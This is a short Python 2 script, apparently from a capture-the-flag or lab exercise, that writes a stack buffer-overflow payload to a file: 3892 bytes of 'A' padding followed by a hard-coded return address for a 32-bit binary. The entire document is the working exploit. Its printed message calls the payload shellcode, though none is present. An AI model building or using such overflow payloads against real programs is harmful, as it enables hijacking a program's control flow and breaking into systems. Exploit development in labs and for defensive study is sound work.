#!/usr/bin/python2

A="\x41"*3892
B="\x2b\x86\x04\x08"


buffer=A+B

print("Saving shellcode")
with open("exploit.txt", 'wt') as f:
    f.write(buffer)
